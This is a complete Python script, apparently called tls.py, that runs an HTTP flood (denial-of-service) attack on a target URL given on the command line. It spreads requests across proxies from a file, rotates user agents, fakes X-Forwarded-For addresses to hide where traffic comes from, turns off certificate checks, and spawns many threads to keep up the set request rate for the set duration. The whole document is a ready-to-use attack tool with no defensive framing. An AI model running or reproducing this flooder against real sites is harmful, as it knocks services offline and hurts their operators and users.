import os
import ssl
import socket
import random
import threading
from urllib.parse import urlparse
from time import sleep, time
import httpx
import colorama
from colorama import Fore

ssl._create_default_https_context = ssl._create_unverified_context


import sys
if len(sys.argv) < 5:
    print(Fore.LIGHTRED_EX + "[!] python tls.py host time rps th")
    sys.exit()


target = sys.argv[1]
duration = int(sys.argv[2])
rps = int(sys.argv[3])
threads = int(sys.argv[4])


def read_lines(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

proxies = read_lines("proxy.txt")
user_agents = read_lines("ua.txt")


def generate_headers(target_url):
    parsed = urlparse(target_url)
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Referer": f"https://{parsed.netloc}{parsed.path}",
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
    }


def send_request(proxy, target_url):
    try:
        proxy_url = f"http://{proxy}"
        headers = generate_headers(target_url)
        parsed = urlparse(target_url)


        with httpx.Client(proxies={"http": proxy_url, "https": proxy_url}, timeout=5) as client:
            response = client.get(target_url, headers=headers)
            print(Fore.LIGHTGREEN_EX + f"[INFO] HTTP {response.status_code} | Proxy: {proxy} | X-Forwarded-For: {headers['X-Forwarded-For']}")
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[ERROR] Proxy: {proxy} | Error: {e}")


def flood(target_url, proxies, duration, rps):
    end_time = time() + duration
    while time() < end_time:
        proxy = random.choice(proxies)
        threading.Thread(target=send_request, args=(proxy, target_url)).start()
        sleep(1 / rps)

if __name__ == "__main__":
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood, args=(target, proxies, duration, rps))
        threads_list.append(t)
        t.start()

    for t in threads_list:
        t.join()
